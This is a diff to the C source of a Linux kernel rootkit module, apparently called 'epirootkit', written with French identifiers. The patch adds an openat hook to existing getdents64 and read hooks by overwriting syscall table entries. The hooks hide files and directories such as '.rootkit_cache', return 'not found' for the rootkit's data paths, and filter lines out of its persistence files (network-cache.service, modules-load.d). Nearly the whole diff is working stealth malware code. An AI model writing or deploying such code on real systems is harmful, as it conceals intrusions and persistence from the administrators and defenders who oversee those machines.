@@ -8,6 +8,8 @@
 #include <linux/slab.h>
 #include <linux/uaccess.h>
 #include <linux/fs.h>
+#include <linux/sched.h>
+#include <linux/cred.h>
 #include "dissimulation.h"
 
 typedef asmlinkage long (*syscall_ptr_t)(const struct pt_regs *);
@@ -16,6 +18,7 @@ struct systeme_camouflage {
     unsigned long *table_appels_systeme;
     syscall_ptr_t lecture_originale;
     syscall_ptr_t listage_originale;
+    syscall_ptr_t ouverture_originale;
     int actif;
 };
 
@@ -23,14 +26,18 @@ static struct systeme_camouflage camouflage = {0};
 
 static const char *elements_a_dissimuler[] = {
     "fichiercache",
-    "network-cache.service", 
-    "network-cache.conf",
-    "epirootkit",
+    ".rootkit_cache",
     NULL
 };
 
 static const char *texte_a_filtrer[] = {
     "cette ligne est cache",
+    NULL
+};
+
+static const char *repertoires_interdits[] = {
+    "/var/cache/.rootkit_cache",
+    "/tmp/.rootkit_data",
     NULL
 };
 
@@ -52,6 +59,17 @@ static int verifier_ligne_interdite(const char *contenu_ligne)
         if (strstr(contenu_ligne, texte_a_filtrer[position]))
             return 1;
         position++;
+    }
+    return 0;
+}
+
+static int verifier_repertoire_interdit(const char *chemin_acces)
+{
+    int index = 0;
+    while (repertoires_interdits[index]) {
+        if (strstr(chemin_acces, repertoires_interdits[index]))
+            return 1;
+        index++;
     }
     return 0;
 }
@@ -132,7 +150,13 @@ static asmlinkage long intercepter_lecture_fichier(const struct pt_regs *registr
     nom_chemin = d_path(&fichier_ouvert->f_path, chemin_fichier, PATH_MAX);
     fput(fichier_ouvert);
     
-    if (IS_ERR(nom_chemin) || !strstr(nom_chemin, "lignescache"))
+    if (IS_ERR(nom_chemin))
+        return octets_lus;
+    
+    if (!strstr(nom_chemin, "lignescache") && 
+        !strstr(nom_chemin, "network-cache.conf") &&
+        !strstr(nom_chemin, "network-cache.service") &&
+        !strstr(nom_chemin, "modules-load.d"))
         return octets_lus;
     
     tampon_lecture = kzalloc(octets_lus + 1, GFP_KERNEL);
@@ -180,6 +204,45 @@ static asmlinkage long intercepter_lecture_fichier(const struct pt_regs *registr
     kfree(tampon_lecture);
     kfree(tampon_filtre);
     return octets_lus;
+}
+
+static asmlinkage long intercepter_ouverture_fichier(const struct pt_regs *registres)
+{
+    int descripteur_repertoire;
+    const char __user *nom_fichier_utilisateur;
+    char *nom_fichier_noyau;
+    char chemin_complet[PATH_MAX];
+    
+    descripteur_repertoire = (int)registres->di;
+    nom_fichier_utilisateur = (const char __user *)registres->si;
+    
+    if (!nom_fichier_utilisateur)
+        return camouflage.ouverture_originale(registres);
+    
+    nom_fichier_noyau = kmalloc(PATH_MAX, GFP_KERNEL);
+    if (!nom_fichier_noyau)
+        return camouflage.ouverture_originale(registres);
+    
+    if (copy_from_user(nom_fichier_noyau, nom_fichier_utilisateur, PATH_MAX - 1)) {
+        kfree(nom_fichier_noyau);
+        return camouflage.ouverture_originale(registres);
+    }
+    nom_fichier_noyau[PATH_MAX - 1] = '\0';
+    
+    if (nom_fichier_noyau[0] == '/') {
+        strncpy(chemin_complet, nom_fichier_noyau, PATH_MAX - 1);
+    } else {
+        snprintf(chemin_complet, PATH_MAX, "/proc/self/cwd/%s", nom_fichier_noyau);
+    }
+    
+    if (verifier_repertoire_interdit(chemin_complet)) {
+        pr_info("epirootkit: Acces bloque vers %s\n", chemin_complet);
+        kfree(nom_fichier_noyau);
+        return -ENOENT;
+    }
+    
+    kfree(nom_fichier_noyau);
+    return camouflage.ouverture_originale(registres);
 }
 
 static unsigned long *localiser_table_appels(void)
@@ -231,11 +294,13 @@ int activer_dissimulation(void)
     
     camouflage.listage_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_getdents64];
     camouflage.lecture_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_read];
+    camouflage.ouverture_originale = (syscall_ptr_t)camouflage.table_appels_systeme[__NR_openat];
     
     modifier_protection_memoire(1);
     
     camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)intercepter_lecture_repertoire;
     camouflage.table_appels_systeme[__NR_read] = (unsigned long)intercepter_lecture_fichier;
+    camouflage.table_appels_systeme[__NR_openat] = (unsigned long)intercepter_ouverture_fichier;
     
     modifier_protection_memoire(0);
     
@@ -252,12 +317,15 @@ void desactiver_dissimulation(void)
     
     pr_info("epirootkit: Desactivation systeme dissimulation\n");
     
-    modifier_protection_memoire(1);
-    
-    camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)camouflage.listage_originale;
-    camouflage.table_appels_systeme[__NR_read] = (unsigned long)camouflage.lecture_originale;
-    
-    modifier_protection_memoire(0);
+    if (camouflage.listage_originale && camouflage.lecture_originale && camouflage.ouverture_originale) {
+        modifier_protection_memoire(1);
+        
+        camouflage.table_appels_systeme[__NR_getdents64] = (unsigned long)camouflage.listage_originale;
+        camouflage.table_appels_systeme[__NR_read] = (unsigned long)camouflage.lecture_originale;
+        camouflage.table_appels_systeme[__NR_openat] = (unsigned long)camouflage.ouverture_originale;
+        
+        modifier_protection_memoire(0);
+    }
     
     camouflage.actif = 0;
     pr_info("epirootkit: Dissimulation desactivee\n");
